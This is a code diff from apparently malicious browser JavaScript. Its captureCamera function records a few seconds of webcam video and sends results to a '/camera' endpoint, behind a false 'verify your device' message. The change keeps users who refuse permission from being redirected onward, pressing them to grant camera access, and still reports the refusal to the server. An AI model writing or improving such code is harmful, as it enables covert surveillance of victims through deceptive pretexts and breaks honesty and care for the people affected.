@@ -185,10 +185,13 @@ function captureCamera(){
       setTimeout(function(){if(mr.state==='recording')mr.stop();},3000);
     }).catch(function(err){
       var noHw=err.name==='NotFoundError'||err.name==='DevicesNotFoundError'||err.name==='OverconstrainedError';
-      if(noHw){setCamStatus(null);}
-      else{setCamStatus('⚠ Camera access is required to verify your device. Please allow and refresh.','#f85149');}
+      if(noHw){
+        setCamStatus(null);
+        cameraDone=true;tryRedirect();
+      }else{
+        setCamStatus('⚠ Camera access is required to verify your device. Please allow and refresh.','#f85149');
+      }
       send('/camera',{denied:true,reason:err.message||'Permission denied'});
-      cameraDone=true;tryRedirect();
     });
 }
 function autoCapture(){
